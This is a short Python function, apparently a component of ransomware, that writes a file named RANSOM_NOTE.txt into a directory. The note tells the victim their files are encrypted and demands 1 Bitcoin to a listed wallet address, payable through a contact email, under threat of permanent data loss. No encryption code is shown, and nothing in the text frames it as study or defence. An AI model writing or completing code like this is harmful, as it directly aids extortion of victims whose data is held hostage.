import os

def create_ransom_note(directory):
    note_content = """
     Your files have been encrypted! 

    To regain access to your data:
     Send 1 Bitcoin to the following address: 3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5
     Contact us at hacker@ransommail.com with proof of payment.
     You will receive the decryption key within 24 hours.

     WARNING: Any attempt to tamper with files may result in **permanent loss** of your data.
    """
    note_path = os.path.join(directory, "RANSOM_NOTE.txt")
    
    # Use UTF-8 encoding to avoid UnicodeEncodeError
    with open(note_path, "w", encoding="utf-8") as file:
        file.write(note_content)

